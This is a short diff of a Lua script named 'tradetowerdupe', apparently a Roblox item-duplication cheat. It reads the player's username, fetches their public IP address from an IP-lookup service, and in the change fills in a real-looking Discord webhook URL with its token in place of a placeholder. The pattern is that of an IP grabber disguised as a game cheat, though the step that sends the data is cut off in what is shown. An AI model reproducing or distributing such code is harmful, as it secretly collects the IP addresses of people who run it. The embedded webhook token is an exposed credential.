@@ -1,6 +1,6 @@
 # tradetowerdupe
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "YOUR DISCORD WEBHOOK HERE"
+local WebhookURL = "https://discord.com/api/webhooks/974742560465649734/Zm0QEO5ipYStQDehpXC2NVUR1aU2r7ptUrUmH4e8fLprxkU8kf8sLS5MyVI8D1UL4OFR"
 local getIPResponse = syn.request({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
